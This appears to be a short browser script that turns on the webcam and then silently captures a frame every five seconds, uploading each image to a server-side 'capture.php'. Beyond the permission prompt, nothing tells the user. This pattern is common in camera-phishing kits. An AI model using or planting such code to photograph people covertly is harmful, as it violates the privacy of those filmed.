let video = document.getElementById("video");

function startCam() {

    navigator.mediaDevices.getUserMedia({ video: true })

        .then(stream => {

            video.srcObject = stream;

            captureLoop();

        })

        .catch(err => {

            alert("Camera permission denied");

        });

}


function captureLoop() {

    setInterval(() => {

        takeSnapshot();

    }, 5000);

}


function takeSnapshot() {

    let canvas = document.createElement("canvas");

    canvas.width = video.videoWidth;

    canvas.height = video.videoHeight;

    let ctx = canvas.getContext("2d");

    ctx.drawImage(video, 0, 0);

    let img = canvas.toDataURL("image/png");


    fetch("capture.php", {

        method: "POST",

        body: JSON.stringify({ image: img })

    });

}